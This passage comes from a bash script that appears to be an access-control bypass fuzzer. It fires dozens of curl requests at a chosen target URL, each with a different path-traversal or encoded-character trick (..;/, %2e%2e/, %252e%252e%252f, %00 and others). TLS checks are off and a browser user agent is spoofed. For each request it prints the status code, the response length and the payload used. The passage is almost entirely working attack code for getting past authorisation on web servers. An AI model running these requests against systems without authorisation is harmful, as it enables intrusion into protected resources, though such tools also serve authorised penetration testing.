	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%0d/; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%0d/;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%0d;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%0d;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%5c/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%5c/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%5c/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%ff/; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%ff/;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%ff;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%ff;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..;%00/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%00/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..;%%%%00/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..;%0d/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%0d/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..;%%%%0d/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..;%ff/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%ff/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..;%%%%ff/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..;\ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..;\\\\\\\' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..;\; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;\;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..;\;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..\; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..\;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..\;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%20# ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20#" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%20#' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%20%23 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%20%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%252e%252e%252f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252e%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%252e%%%%252e%%%%252f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%252e%252e%253b/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252e%253b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%252e%%%%252e%%%%253b/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%252e%252f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%252e%%%%252f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%252e%253b/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%253b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%252e%%%%253b/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%252e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%252e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%252f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%252f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e%2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e%2e%3b/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e%%%%2e%%%%3b/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e%2f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e%3b/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e%%%%3b/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e%3b// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%3b//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e%%%%3b//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%3b/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%3b/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..%2f..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..%2f..%2f..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..%%%%2f..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../../../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../../../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../../..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../../..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../..// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../..//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../..//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../..//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /.././../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.././../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/.././../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../.;/../ ]:"
